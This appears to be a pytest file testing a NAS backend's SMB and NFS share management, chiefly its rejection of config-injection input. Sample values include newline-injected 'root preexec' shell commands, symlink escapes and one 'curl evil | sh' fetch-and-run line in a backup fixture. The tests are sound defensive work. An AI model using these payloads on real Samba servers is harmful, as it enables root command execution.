import logging
import os
import stat
import subprocess
import tempfile
from types import SimpleNamespace

import pytest
from unittest.mock import patch, MagicMock
from fastapi import HTTPException
from fastapi.testclient import TestClient

from src.host import HostResult
from src.shares import smb, nfs
from src.shares.schemas import SmbShareCreate, SmbShareInfo, NfsExportCreate
from src.security.validators import validate_share_name, validate_share_path, RESERVED_SMB_NAMES

INITIAL_SMB_CONF = """[global]
   workgroup = WORKGROUP
   server string = UNOS NAS
   security = user
   map to guest = Bad Password
   log file = /var/log/samba/log.%m
   max log size = 50
   dns proxy = no

"""


class TestSmbModule:
    """Tests for SMB share management."""

    @pytest.fixture
    def temp_smb_conf(self):
        """Create temporary smb.conf."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf", delete=False) as f:
            f.write(INITIAL_SMB_CONF)
            path = f.name
        yield path
        if os.path.exists(path):
            os.unlink(path)

    @pytest.fixture
    def mock_settings(self, temp_smb_conf, tmp_path):
        """Mock settings with temp paths."""
        mock_settings = MagicMock()
        mock_settings.smb_conf_path = temp_smb_conf
        mock_settings.pools_base_path = str(tmp_path)  # Use tmp_path as pools base
        with patch("src.shares.smb.settings", mock_settings):
            with patch("src.security.validators.settings", mock_settings):
                yield mock_settings

    @pytest.fixture
    def mock_subprocess(self):
        """Mock host commands (testparm, smbcontrol)."""
        with patch("src.shares.smb.run_on_host") as mock_run:
            mock_run.return_value = HostResult(0, "", "")
            yield mock_run

    def test_list_shares_empty(self, mock_settings, mock_subprocess):
        """Test listing shares when none exist."""
        shares = smb.list_shares()
        assert shares == []

    def test_create_share_success(self, mock_settings, mock_subprocess, tmp_path):
        """Test creating a new SMB share."""
        share_path = str(tmp_path / "test_share")
        share = SmbShareCreate(
            name="test_share",
            path=share_path,
            comment="Test share",
            browseable=True,
            readonly=False,
            guest_ok=True,
            valid_users=[]
        )

        result = smb.create_share(share)

        assert result.name == "test_share"
        assert result.path == share_path
        assert result.comment == "Test share"
        assert result.browseable is True
        assert result.readonly is False
        assert result.guest_ok is True
        assert os.path.exists(share_path)
        assert stat.S_IMODE(os.stat(share_path).st_mode) == 0o777
        mock_subprocess.assert_called()

    def test_create_share_invalid_name(self, mock_settings, mock_subprocess, tmp_path):
        """Test that invalid share names are rejected."""
        share = SmbShareCreate(
            name="invalid-name!",
            path=str(tmp_path / "test")
        )

        with pytest.raises(HTTPException):
            smb.create_share(share)

    def test_create_share_duplicate(self, mock_settings, mock_subprocess, tmp_path):
        """Test that duplicate share names are rejected."""
        share_path = str(tmp_path / "test_share")
        share = SmbShareCreate(name="test_share", path=share_path)

        smb.create_share(share)

        with pytest.raises(ValueError, match="already exists"):
            smb.create_share(share)

        # Samba share names are case-insensitive.
        with pytest.raises(ValueError, match="already exists"):
            smb.create_share(SmbShareCreate(name="TEST_SHARE", path=share_path))

    def test_get_share_exists(self, mock_settings, mock_subprocess, tmp_path):
        """Test getting an existing share."""
        share_path = str(tmp_path / "test_share")
        share = SmbShareCreate(name="test_share", path=share_path)
        smb.create_share(share)

        result = smb.get_share("test_share")

        assert result is not None
        assert result.name == "test_share"

    def test_get_share_not_found(self, mock_settings, mock_subprocess):
        """Test getting a non-existent share."""
        result = smb.get_share("nonexistent")
        assert result is None

    def test_delete_share_success(self, mock_settings, mock_subprocess, tmp_path):
        """Test deleting an existing share."""
        share_path = str(tmp_path / "test_share")
        share = SmbShareCreate(name="test_share", path=share_path)
        smb.create_share(share)

        smb.delete_share("test_share")

        result = smb.get_share("test_share")
        assert result is None

    def test_delete_share_not_found(self, mock_settings, mock_subprocess):
        """Test deleting a non-existent share."""
        with pytest.raises(ValueError, match="not found"):
            smb.delete_share("nonexistent")

    def test_update_share(self, mock_settings, mock_subprocess, tmp_path):
        """Test updating an existing share."""
        share_path = str(tmp_path / "test_share")
        share = SmbShareCreate(name="test_share", path=share_path, comment="Original")
        smb.create_share(share)

        updated = SmbShareCreate(
            name="test_share",
            path=share_path,
            comment="Updated comment",
            readonly=True
        )
        result = smb.update_share("test_share", updated)

        assert result.comment == "Updated comment"
        assert result.readonly is True

    def test_update_share_cannot_take_another_shares_name(self, mock_settings, mock_subprocess, tmp_path):
        smb.create_share(SmbShareCreate(name="one", path=str(tmp_path / "one")))
        smb.create_share(SmbShareCreate(name="two", path=str(tmp_path / "two")))

        with pytest.raises(ValueError, match="already exists"):
            smb.update_share("one", SmbShareCreate(name="Two", path=str(tmp_path / "one")))
        assert {s.name for s in smb.list_shares()} == {"one", "two"}

    def test_parse_smb_conf(self, mock_settings, mock_subprocess, tmp_path):
        """Test parsing smb.conf with multiple shares."""
        # Create conf with multiple shares
        conf_content = """[global]
   workgroup = WORKGROUP

[share1]
   path = /data/share1
   comment = First share
   browseable = yes
   read only = no
   guest ok = yes

[share2]
   path = /data/share2
   comment = Second share
   browseable = no
   read only = yes
   valid users = user1, user2
"""
        with open(mock_settings.smb_conf_path, "w") as f:
            f.write(conf_content)

        shares = smb.list_shares()

        assert len(shares) == 2

        share1 = next(s for s in shares if s.name == "share1")
        assert share1.path == "/data/share1"
        assert share1.browseable is True
        assert share1.guest_ok is True

        share2 = next(s for s in shares if s.name == "share2")
        assert share2.readonly is True
        assert share2.valid_users == ["user1", "user2"]

    def test_parser_splits_lines_like_samba(self, mock_settings, mock_subprocess):
        """Only "\\n" ends a line; str.splitlines() would also split on U+2028."""
        with open(mock_settings.smb_conf_path, "w", encoding="utf-8") as f:
            f.write("[a]\n   path = /x\n   comment = one\u2028path = /\n")
        (share,) = smb.list_shares()
        assert share.path == "/x"


class TestSmbInjection:
    """Hostile share definitions must never reach smb.conf (I3)."""

    @pytest.fixture
    def conf(self, tmp_path):
        base = tmp_path / "pools"
        (base / "data").mkdir(parents=True)
        conf_dir = tmp_path / "samba"
        conf_dir.mkdir()
        conf_path = conf_dir / "smb.conf"
        conf_path.write_text(INITIAL_SMB_CONF)
        os.chmod(conf_path, 0o644)
        settings = SimpleNamespace(smb_conf_path=str(conf_path), pools_base_path=str(base))
        with patch("src.shares.smb.settings", settings), patch("src.security.validators.settings", settings):
            with patch("src.shares.smb.run_on_host", return_value=HostResult(0, "", "")) as host:
                yield SimpleNamespace(path=conf_path, dir=conf_dir, base=base, pool=base / "data", host=host)

    def _share(self, conf, **overrides):
        values = {"name": "docs", "path": str(conf.pool / "docs")}
        values.update(overrides)
        return SmbShareCreate(**values)

    @pytest.mark.parametrize(
        "comment",
        [
            "x\n[evil]\n   path = /\n   root preexec = /bin/sh -c id",
            "x\r\nroot preexec = id",
            "line\x0bbreak",
            "unicode\u2028line separator",
            "nul\x00byte",
            "[bracket",
            "bracket]",
            "trailing backslash \\",
            "tab\tcharacter",
            "c" * 257,
        ],
    )
    def test_hostile_comment_rejected(self, conf, comment):
        with pytest.raises(HTTPException) as exc:
            smb.create_share(self._share(conf, comment=comment))
        assert exc.value.status_code == 400
        assert conf.path.read_text() == INITIAL_SMB_CONF

    @pytest.mark.parametrize(
        "name",
        [
            "docs\n", "docs]", "do[cs", "docs\nroot preexec = id", "-docs", "a" * 33, "",
            "global", "GLOBAL", "homes", "printers", "print$", "IPC$", "ipc$",
        ],
    )
    def test_hostile_name_rejected(self, conf, name):
        with pytest.raises(HTTPException) as exc:
            smb.create_share(self._share(conf, name=name))
        assert exc.value.status_code == 400
        assert conf.path.read_text() == INITIAL_SMB_CONF

    @pytest.mark.parametrize("name", ["docs", "my-share", "_hidden", "A1", "a" * 32])
    def test_valid_names_accepted(self, conf, name):
        share = smb.create_share(self._share(conf, name=name, path=str(conf.pool / "x")))
        assert share.name == name

    @pytest.mark.parametrize(
        "users",
        [
            ["alice, root"],
            ["alice root"],
            ["alice\nroot preexec = id"],
            ["%S"],
            ["alice\\"],
            ["-alice"],
            [""],
            ["@"],
            ["u" * 33],
        ],
    )
    def test_hostile_valid_users_rejected(self, conf, users):
        with pytest.raises(HTTPException) as exc:
            smb.create_share(self._share(conf, valid_users=users))
        assert exc.value.status_code == 400
        assert conf.path.read_text() == INITIAL_SMB_CONF

    def test_valid_users_and_groups_written(self, conf):
        smb.create_share(self._share(conf, valid_users=["alice", "bob.smith", "@staff"]))
        assert "   valid users = alice, bob.smith, @staff\n" in conf.path.read_text()

    @pytest.mark.parametrize(
        "path_template",
        [
            "/etc",
            "{tmp}/outside",
            "{base}",
            "{base}/../outside",
            "{base}-old/share",
            "{base}X/share",
            "{base}/data/x\n   root preexec = id",
            "{base}/data/per-user-%U",
            "{base}/data/trailing\\",
            '{base}/data/quoted"',
            "{base}/data/trailing-space ",
            "{base}/data/two  spaces",
            "data/relative",
            "",
        ],
    )
    def test_hostile_path_rejected(self, conf, path_template):
        path = path_template.format(base=conf.base, tmp=conf.base.parent)
        with pytest.raises(HTTPException) as exc:
            smb.create_share(self._share(conf, path=path))
        assert exc.value.status_code == 400
        assert conf.path.read_text() == INITIAL_SMB_CONF

    def test_symlink_escaping_pools_rejected(self, conf, tmp_path):
        outside = tmp_path / "outside"
        outside.mkdir()
        os.symlink(outside, conf.pool / "escape")
        with pytest.raises(HTTPException):
            smb.create_share(self._share(conf, path=str(conf.pool / "escape")))
        assert conf.path.read_text() == INITIAL_SMB_CONF

    def test_path_is_normalized(self, conf):
        share = smb.create_share(self._share(conf, path=f"{conf.pool}//docs/./"))
        assert share.path == str((conf.pool / "docs").resolve())

    def test_symlink_to_percent_directory_is_not_shared(self, conf):
        """A link planted (e.g. by an app) must not smuggle '%U' into smb.conf's path."""
        (conf.pool / "apps").mkdir()
        os.symlink(conf.pool / "%U" / "%U" / "%U", conf.pool / "apps" / "downloads")
        with pytest.raises(HTTPException) as exc:
            smb.create_share(self._share(conf, path=str(conf.pool / "apps" / "downloads"), guest_ok=True))
        assert exc.value.status_code == 400
        assert conf.path.read_text() == INITIAL_SMB_CONF
        assert not (conf.pool / "%U").exists()

    def test_symlink_to_other_pool_is_not_shared_or_made_world_writable(self, conf):
        private = conf.base / "backup" / "hr-private"
        private.mkdir(parents=True)
        os.chmod(private, 0o700)
        (conf.pool / "apps").mkdir()
        os.symlink(private, conf.pool / "apps" / "downloads")
        with pytest.raises(HTTPException) as exc:
            smb.create_share(self._share(conf, path=str(conf.pool / "apps" / "downloads"), guest_ok=True))
        assert exc.value.status_code == 400
        assert "symbolic link" in exc.value.detail
        assert stat.S_IMODE(os.stat(private).st_mode) == 0o700
        assert conf.path.read_text() == INITIAL_SMB_CONF

    def test_update_refuses_share_directory_swapped_for_symlink(self, conf):
        """The UI re-sends the stored path on edit; a directory swapped since must not be followed."""
        private = conf.base / "backup" / "hr-private"
        private.mkdir(parents=True)
        os.chmod(private, 0o700)
        share_path = str(conf.pool / "docs")
        smb.create_share(self._share(conf, path=share_path))
        before = conf.path.read_text()

        os.rmdir(share_path)
        os.symlink(private, share_path)
        with pytest.raises(HTTPException) as exc:
            smb.update_share("docs", self._share(conf, path=share_path, guest_ok=True))
        assert exc.value.status_code == 400
        assert stat.S_IMODE(os.stat(private).st_mode) == 0o700
        assert conf.path.read_text() == before

    def test_stored_path_is_the_given_path(self, conf):
        (conf.pool / "Team Docs").mkdir()
        share = smb.create_share(self._share(conf, path=f"{conf.pool}/Team Docs"))
        assert share.path == f"{conf.pool}/Team Docs"
        assert f"   path = {conf.pool}/Team Docs\n" in conf.path.read_text()
        assert smb.get_share("docs").path == share.path

    def test_guest_share_chmod_does_not_follow_swapped_symlink(self, conf, tmp_path):
        """A component replaced by a symlink after validation must not be followed."""
        outside = tmp_path / "outside"
        outside.mkdir()
        os.chmod(outside, 0o700)
        os.symlink(outside, conf.pool / "swapped")
        swapped = str(conf.pool / "swapped")
        with patch("src.shares.smb.validate_share_path", return_value=swapped):
            with pytest.raises(HTTPException):
                smb.create_share(self._share(conf, path=swapped, guest_ok=True))
        assert stat.S_IMODE(os.stat(outside).st_mode) == 0o700
        assert conf.path.read_text() == INITIAL_SMB_CONF

    def test_serializer_refuses_unsafe_values(self):
        """Last line of defence: even unvalidated objects cannot inject lines."""
        for field, value in [("comment", "a\nb"), ("path", "/x\r"), ("name", "a\u2028b"), ("comment", "a\\")]:
            values = dict(name="a", path="/x", comment="", browseable=True, readonly=False,
                          guest_ok=False, valid_users=[])
            values[field] = value
            with pytest.raises(smb.SambaConfigError):
                smb._share_to_config(SmbShareInfo(**values))
        with pytest.raises(smb.SambaConfigError):
            smb._share_to_config(SmbShareInfo(name="a", path="/x", comment="", browseable=True,
                                              readonly=False, guest_ok=False, valid_users=["a\nb"]))

    @pytest.mark.parametrize("path", ["/x/%U", "/x/%", "/x\\y", '/x"', '"/x"', "/x ", " /x", "/a  b", "/a \tb"])
    def test_serializer_refuses_paths_samba_would_read_differently(self, path):
        share = SmbShareInfo(name="a", path=path, comment="", browseable=True, readonly=False,
                             guest_ok=False, valid_users=[])
        with pytest.raises(smb.SambaConfigError):
            smb._share_to_config(share)

    def test_serializer_keeps_other_percent_values(self):
        """Only path is checked for '%': e.g. Debian's 'valid users = %S' is rewritten unchanged."""
        share = SmbShareInfo(name="a", path="/x y", comment="", browseable=True, readonly=False,
                             guest_ok=False, valid_users=["%S"])
        config = smb._share_to_config(share)
        assert "   path = /x y\n" in config
        assert "   valid users = %S\n" in config

    def test_written_atomically_validated_and_reloaded(self, conf):
        smb.create_share(self._share(conf, comment="Team documents"))

        content = conf.path.read_text()
        assert "[docs]\n   path = " in content
        assert "   comment = Team documents\n" in content
        assert stat.S_IMODE(os.stat(conf.path).st_mode) == 0o644
        assert sorted(os.listdir(conf.dir)) == ["smb.conf"]  # no temp files left behind

        commands = [call.args[0] for call in conf.host.call_args_list]
        testparm, reload = commands
        assert testparm[:3] == ["testparm", "-s", "--suppress-prompt"]
        assert os.path.dirname(testparm[3]) == str(conf.dir)  # temp file next to smb.conf
        assert reload == ["smbcontrol", "smbd", "reload-config"]

    def test_testparm_failure_keeps_old_config(self, conf):
        def host(cmd, **kwargs):
            if cmd[0] == "testparm":
                return HostResult(1, "", "Error loading services.")
            return HostResult(0, "", "")

        conf.host.side_effect = host
        with pytest.raises(smb.SambaConfigError, match="Error loading services"):
            smb.create_share(self._share(conf))
        assert conf.path.read_text() == INITIAL_SMB_CONF
        assert sorted(os.listdir(conf.dir)) == ["smb.conf"]
        assert not any(call.args[0][0] == "smbcontrol" for call in conf.host.call_args_list)

    @pytest.mark.parametrize(
        "missing", [FileNotFoundError("nsenter"), HostResult(127, "", "nsenter: failed to execute testparm")]
    )
    def test_missing_testparm_installs_with_warning(self, conf, caplog, missing):
        def host(cmd, **kwargs):
            if cmd[0] == "testparm":
                if isinstance(missing, Exception):
                    raise missing
                return missing
            return HostResult(0, "", "")

        conf.host.side_effect = host
        with caplog.at_level(logging.WARNING, logger="src.shares.smb"):
            smb.create_share(self._share(conf))
        assert "[docs]" in conf.path.read_text()
        assert "testparm" in caplog.text

    def test_testparm_timeout_is_an_error(self, conf):
        def host(cmd, **kwargs):
            if cmd[0] == "testparm":
                raise subprocess.TimeoutExpired(cmd, 30)
            return HostResult(0, "", "")

        conf.host.side_effect = host
        with pytest.raises(smb.SambaConfigError):
            smb.create_share(self._share(conf))
        assert conf.path.read_text() == INITIAL_SMB_CONF

    def test_reload_falls_back_to_systemctl_and_logs_failures(self, conf, caplog):
        calls = []

        def host(cmd, **kwargs):
            calls.append(cmd)
            if cmd[0] == "smbcontrol":
                return HostResult(1, "", "Can't find pid for destination 'smbd'")
            if cmd[0] == "systemctl":
                return HostResult(1, "", "smbd.service is not active")
            return HostResult(0, "", "")

        conf.host.side_effect = host
        with caplog.at_level(logging.WARNING, logger="src.shares.smb"):
            smb.create_share(self._share(conf))  # the change itself succeeds
        assert ["systemctl", "reload", "smbd"] in calls
        assert "Can't find pid" in caplog.text
        assert "did not reload" in caplog.text


class TestSmbBackupStaging:
    """smb.conf from a backup archive is untrusted (used by backup restore)."""

    @pytest.fixture
    def conf(self, tmp_path):
        base = tmp_path / "pools"
        (base / "data").mkdir(parents=True)
        conf_path = tmp_path / "smb.conf"
        conf_path.write_text(INITIAL_SMB_CONF)
        settings = SimpleNamespace(smb_conf_path=str(conf_path), pools_base_path=str(base))
        with patch("src.shares.smb.settings", settings), patch("src.security.validators.settings", settings):
            with patch("src.shares.smb.run_on_host", return_value=HostResult(0, "", "")) as host:
                yield SimpleNamespace(path=conf_path, base=base, host=host)

    def test_only_valid_shares_are_kept(self, conf):
        archived = f"""[global]
   workgroup = EVIL
   root preexec = /bin/sh -c 'curl evil | sh'
[good]
   path = {conf.base}/data/good
   comment = Fine
   root preexec = /bin/sh -c id
[outside]
   path = /etc
[homes]
   browseable = no
[bad name!]
   path = {conf.base}/data/x
"""
        staged, warnings = smb.stage_backup_config(archived)
        assert conf.path.read_text() == INITIAL_SMB_CONF  # nothing installed yet
        staged.install()
        content = conf.path.read_text()
        assert "root preexec" not in content
        assert "EVIL" not in content
        assert "[good]" in content and "[outside]" not in content and "[homes]" not in content
        assert staged.share_names == ["good"]
        assert len(warnings) == 4  # global ignored + three skipped shares

    def test_shares_through_symlinks_are_skipped(self, conf, tmp_path):
        outside = tmp_path / "outside"
        outside.mkdir()
        (conf.base / "data" / "good").mkdir()
        os.symlink(conf.base / "data" / "good", conf.base / "data" / "alias")
        os.symlink(outside, conf.base / "data" / "escape")
        os.symlink(conf.base / "data" / "%U", conf.base / "data" / "percent")
        archived = f"""[good]
   path = {conf.base}/data/good
[alias]
   path = {conf.base}/data/alias
[escape]
   path = {conf.base}/data/escape/sub
[percent]
   path = {conf.base}/data/percent
"""
        staged, warnings = smb.stage_backup_config(archived)
        try:
            assert staged.share_names == ["good"]
            assert sum("symbolic link" in w for w in warnings) == 3
        finally:
            staged.discard()

    def test_discard_leaves_config_untouched(self, conf, tmp_path):
        staged, _ = smb.stage_backup_config(f"[good]\n   path = {conf.base}/data/good\n")
        staged.discard()
        assert conf.path.read_text() == INITIAL_SMB_CONF
        assert sorted(p.name for p in tmp_path.iterdir()) == ["pools", "smb.conf"]

    def test_testparm_rejection_raises(self, conf):
        conf.host.return_value = HostResult(1, "", "Error loading services.")
        with pytest.raises(smb.SambaConfigError):
            smb.stage_backup_config(f"[good]\n   path = {conf.base}/data/good\n")
        assert conf.path.read_text() == INITIAL_SMB_CONF


class TestSmbRouter:
    """Validation errors must surface as 400, not 500."""

    @pytest.fixture
    def client(self, tmp_path):
        from src.auth.utils import verify_token
        from src.main import app

        base = tmp_path / "pools"
        (base / "data").mkdir(parents=True)
        conf_path = tmp_path / "smb.conf"
        conf_path.write_text(INITIAL_SMB_CONF)
        settings = SimpleNamespace(smb_conf_path=str(conf_path), pools_base_path=str(base))
        app.dependency_overrides[verify_token] = lambda: SimpleNamespace(id=1, username="admin", is_admin=True)
        with patch("src.shares.smb.settings", settings), patch("src.security.validators.settings", settings):
            with patch("src.shares.smb.run_on_host", return_value=HostResult(0, "", "")):
                yield SimpleNamespace(client=TestClient(app), conf=conf_path, base=base)
        app.dependency_overrides.pop(verify_token, None)

    def test_create_with_injected_comment_is_400(self, client):
        response = client.client.post(
            "/api/v1/shares/smb",
            json={"name": "docs", "path": str(client.base / "data" / "docs"), "comment": "x\nroot preexec = id"},
        )
        assert response.status_code == 400
        assert client.conf.read_text() == INITIAL_SMB_CONF

    def test_update_with_bad_path_is_400(self, client):
        response = client.client.post(
            "/api/v1/shares/smb", json={"name": "docs", "path": str(client.base / "data" / "docs")}
        )
        assert response.status_code == 200, response.text
        response = client.client.put("/api/v1/shares/smb/docs", json={"name": "docs", "path": "/etc"})
        assert response.status_code == 400

    def test_create_through_symlink_is_400(self, client):
        os.symlink(client.base / "data", client.base / "data" / "loop")
        response = client.client.post(
            "/api/v1/shares/smb", json={"name": "docs", "path": str(client.base / "data" / "loop" / "docs")}
        )
        assert response.status_code == 400
        assert "symbolic link" in response.json()["detail"]
        assert client.conf.read_text() == INITIAL_SMB_CONF

    def test_testparm_failure_is_500_with_reason(self, client):
        with patch("src.shares.smb.run_on_host", return_value=HostResult(1, "", "Error loading services.")):
            response = client.client.post(
                "/api/v1/shares/smb", json={"name": "docs", "path": str(client.base / "data" / "docs")}
            )
        assert response.status_code == 500
        assert "testparm" in response.json()["detail"]
        assert client.conf.read_text() == INITIAL_SMB_CONF

    def test_nfs_bad_client_is_400(self, client, tmp_path):
        exports = tmp_path / "exports"
        exports.write_text("")
        with patch("src.shares.nfs.settings", SimpleNamespace(nfs_exports_path=str(exports))):
            response = client.client.post(
                "/api/v1/shares/nfs",
                json={"path": str(client.base / "data"), "clients": "* /etc", "options": "rw"},
            )
        assert response.status_code == 400
        assert exports.read_text() == ""


class TestNfsModule:
    """Tests for NFS export management."""

    @pytest.fixture
    def temp_exports(self):
        """Create temporary exports file."""
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            f.write("")
            path = f.name
        yield path
        if os.path.exists(path):
            os.unlink(path)

    @pytest.fixture
    def mock_settings(self, temp_exports, tmp_path):
        """Mock settings with temp paths."""
        mock_settings = MagicMock()
        mock_settings.nfs_exports_path = temp_exports
        mock_settings.pools_base_path = str(tmp_path)
        with patch("src.shares.nfs.settings", mock_settings):
            with patch("src.security.validators.settings", mock_settings):
                yield mock_settings

    @pytest.fixture
    def mock_subprocess(self):
        """Mock subprocess for exportfs."""
        with patch("src.shares.nfs.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
            yield mock_run

    def test_list_exports_empty(self, mock_settings, mock_subprocess):
        """Test listing exports when none exist."""
        exports = nfs.list_exports()
        assert exports == []

    def test_create_export_success(self, mock_settings, mock_subprocess, tmp_path):
        """Test creating a new NFS export."""
        export_path = str(tmp_path / "nfs_export")
        os.makedirs(export_path)

        export = NfsExportCreate(
            path=export_path,
            clients="192.168.1.0/24",
            options="rw,sync,no_subtree_check"
        )

        result = nfs.create_export(export)

        assert result.path == export_path
        assert result.clients == "192.168.1.0/24"
        mock_subprocess.assert_called()
        with open(mock_settings.nfs_exports_path) as f:
            assert f.read() == f"{export_path} 192.168.1.0/24(rw,sync,no_subtree_check)\n"

    def test_create_export_duplicate(self, mock_settings, mock_subprocess, tmp_path):
        """Test that duplicate exports are rejected."""
        export_path = str(tmp_path / "nfs_export")
        os.makedirs(export_path)

        export = NfsExportCreate(path=export_path)
        nfs.create_export(export)

        with pytest.raises(ValueError, match="already exists"):
            nfs.create_export(export)

    def test_delete_export_success(self, mock_settings, mock_subprocess, tmp_path):
        """Test deleting an NFS export."""
        export_path = str(tmp_path / "nfs_export")
        os.makedirs(export_path)

        export = NfsExportCreate(path=export_path)
        nfs.create_export(export)

        nfs.delete_export(export_path)

        exports = nfs.list_exports()
        assert len([e for e in exports if e.path == export_path]) == 0

    def test_delete_export_not_found(self, mock_settings, mock_subprocess):
        """Test deleting a non-existent export."""
        with pytest.raises(ValueError, match="not found"):
            nfs.delete_export("/nonexistent/path")

    def test_parse_exports(self, mock_settings, mock_subprocess):
        """Test parsing exports file with multiple entries."""
        exports_content = """/data/share1 192.168.1.0/24(rw,sync)
/data/share2 *(ro,async)
"""
        with open(mock_settings.nfs_exports_path, "w") as f:
            f.write(exports_content)

        exports = nfs.list_exports()

        assert len(exports) == 2

        export1 = next(e for e in exports if e.path == "/data/share1")
        assert export1.clients == "192.168.1.0/24"
        assert export1.options == "rw,sync"

        export2 = next(e for e in exports if e.path == "/data/share2")
        assert export2.clients == "*"
        assert export2.options == "ro,async"

    @pytest.mark.parametrize(
        "clients", ["*", "192.168.1.0/24", "10.0.0.1", "fe80::/64", "192.168.1.0/255.255.255.0",
                    "nas.local", "*.example.com", "host?"],
    )
    def test_valid_clients_accepted(self, mock_settings, mock_subprocess, tmp_path, clients):
        result = nfs.create_export(NfsExportCreate(path=str(tmp_path / "e"), clients=clients))
        assert result.clients == clients

    @pytest.mark.parametrize(
        "clients",
        ["* (rw) evil", "*(rw,no_root_squash)", "host\n/etc *(rw)", "a b", "", "host#x",
         "a,b", "@netgroup", "10.0.0.0/33", "-host", "x" * 256],
    )
    def test_hostile_clients_rejected(self, mock_settings, mock_subprocess, tmp_path, clients):
        with pytest.raises((ValueError, HTTPException)):
            nfs.create_export(NfsExportCreate(path=str(tmp_path / "e"), clients=clients))
        assert nfs.list_exports() == []

    @pytest.mark.parametrize(
        "options", ["rw,sync,no_subtree_check", "ro", "rw,anonuid=1000,anongid=100,fsid=1,sec=krb5:sys",
                    "rw,no_root_squash,insecure", "rw,fsid=root"],
    )
    def test_valid_options_accepted(self, mock_settings, mock_subprocess, tmp_path, options):
        assert nfs.create_export(NfsExportCreate(path=str(tmp_path / "e"), options=options)).options == options

    @pytest.mark.parametrize(
        "options",
        ["rw)\n/ *(rw", "rw,nosuchopt", "", "rw,,sync", "anonuid=abc", "mp=/etc", "rw sync",
         "rw)(", "sec=none", "rw\n", "refer=/x@host"],
    )
    def test_hostile_options_rejected(self, mock_settings, mock_subprocess, tmp_path, options):
        with pytest.raises(ValueError):
            nfs.create_export(NfsExportCreate(path=str(tmp_path / "e"), options=options))
        assert nfs.list_exports() == []

    @pytest.mark.parametrize(
        "path_template", ["/etc", "{tmp}", "{tmp}/../x", "{tmp}/a b", "{tmp}/x\n/ *", "{tmp}/a#b", "{tmp}/a(b)", "x"],
    )
    def test_hostile_paths_rejected(self, mock_settings, mock_subprocess, tmp_path, path_template):
        with pytest.raises((ValueError, HTTPException)):
            nfs.create_export(NfsExportCreate(path=path_template.format(tmp=tmp_path)))
        assert nfs.list_exports() == []

    def test_export_through_symlink_rejected(self, mock_settings, mock_subprocess, tmp_path):
        (tmp_path / "private").mkdir()
        (tmp_path / "apps").mkdir()
        os.symlink(tmp_path / "private", tmp_path / "apps" / "downloads")
        for path in (tmp_path / "apps" / "downloads", tmp_path / "apps" / "downloads" / "sub"):
            with pytest.raises(HTTPException) as exc:
                nfs.create_export(NfsExportCreate(path=str(path)))
            assert exc.value.status_code == 400
        assert nfs.list_exports() == []
        assert list((tmp_path / "private").iterdir()) == []

    def test_export_dir_creation_does_not_follow_swapped_symlink(self, mock_settings, mock_subprocess, tmp_path):
        """A component replaced by a symlink after validation must not be followed by mkdir."""
        outside = tmp_path / "outside"
        outside.mkdir()
        os.symlink(outside, tmp_path / "swapped")
        swapped = str(tmp_path / "swapped" / "new")
        with patch("src.shares.nfs.validate_pools_path", return_value=swapped):
            with pytest.raises(ValueError, match="not a usable directory"):
                nfs.create_export(NfsExportCreate(path=swapped))
        assert list(outside.iterdir()) == []
        assert nfs.list_exports() == []


class TestShareSecurityValidation:
    """Tests for share security validation."""

    def test_share_name_valid(self):
        """Test valid share names are accepted."""
        valid_names = ["documents", "my_share", "Share123", "data_backup", "my-share", "_x"]
        for name in valid_names:
            result = validate_share_name(name)
            assert result == name

    def test_share_name_invalid_characters_rejected(self):
        """Test share names with invalid characters are rejected."""
        invalid_names = [
            "-share",  # leading hyphen
            "share.name",  # dot
            "share name",  # space
            "share;name",  # semicolon
            "share|name",  # pipe
            "share]",  # section terminator
            "share\n",  # trailing newline
            "a" * 33,  # too long
        ]
        for name in invalid_names:
            with pytest.raises(HTTPException) as exc:
                validate_share_name(name)
            assert exc.value.status_code == 400

    def test_reserved_share_names_rejected(self):
        """Test reserved SMB share names are rejected."""
        # Test valid-pattern reserved names (those without special chars like $)
        valid_pattern_reserved = ["global", "homes", "printers", "Global", "HOMES"]
        for name in valid_pattern_reserved:
            with pytest.raises(HTTPException) as exc:
                validate_share_name(name)
            assert exc.value.status_code == 400
            assert "reserved" in exc.value.detail.lower()

        # Test reserved names with special chars (fail pattern check first)
        special_char_reserved = ["print$", "ipc$", "admin$", "c$", "d$"]
        for name in special_char_reserved:
            with pytest.raises(HTTPException) as exc:
                validate_share_name(name)
            assert exc.value.status_code == 400
        assert {"global", "homes", "printers", "print$", "ipc$"} <= RESERVED_SMB_NAMES

    @patch("src.security.validators.settings")
    def test_share_path_must_be_in_pools(self, mock_settings):
        """Test share paths must be within pools directory."""
        mock_settings.pools_base_path = "/mnt/pools"

        # Path outside pools should be rejected
        with pytest.raises(HTTPException) as exc:
            validate_share_path("/etc/passwd")
        assert exc.value.status_code == 400
        assert "pools" in exc.value.detail.lower()

        with pytest.raises(HTTPException) as exc:
            validate_share_path("/root/secret")
        assert exc.value.status_code == 400

    @patch("src.security.validators.settings")
    def test_share_path_traversal_rejected(self, mock_settings):
        """Test path traversal in share paths is rejected."""
        mock_settings.pools_base_path = "/mnt/pools"

        with pytest.raises(HTTPException) as exc:
            validate_share_path("/mnt/pools/../etc/passwd")
        assert exc.value.status_code == 400

    @patch("src.shares.smb.settings")
    @patch("src.shares.smb.run_on_host")
    def test_create_share_validates_path(self, mock_run, mock_settings, tmp_path):
        """Test that create_share validates path is within pools."""
        mock_settings.smb_conf_path = str(tmp_path / "smb.conf")
        mock_settings.pools_base_path = "/mnt/pools"
        mock_run.return_value = HostResult(0, "", "")

        # Write initial config
        with open(mock_settings.smb_conf_path, "w") as f:
            f.write("[global]\n   workgroup = WORKGROUP\n\n")

        share = SmbShareCreate(
            name="test_share",
            path="/etc/passwd"  # Outside pools
        )

        with pytest.raises(HTTPException) as exc:
            smb.create_share(share)
        assert exc.value.status_code == 400
        mock_run.assert_not_called()

    @patch("src.security.validators.settings")
    @patch("src.shares.smb.settings")
    @patch("src.shares.smb.run_on_host")
    def test_update_share_validates_path(self, mock_run, mock_smb_settings, mock_val_settings, tmp_path):
        """Test that update_share validates the new path."""
        # Setup settings
        mock_smb_settings.smb_conf_path = str(tmp_path / "smb.conf")
        mock_smb_settings.pools_base_path = str(tmp_path)
        mock_val_settings.pools_base_path = str(tmp_path)
        mock_run.return_value = HostResult(0, "", "")

        # Create initial share within pools
        with open(mock_smb_settings.smb_conf_path, "w") as f:
            f.write("[global]\n   workgroup = WORKGROUP\n\n")

        share_path = str(tmp_path / "original")
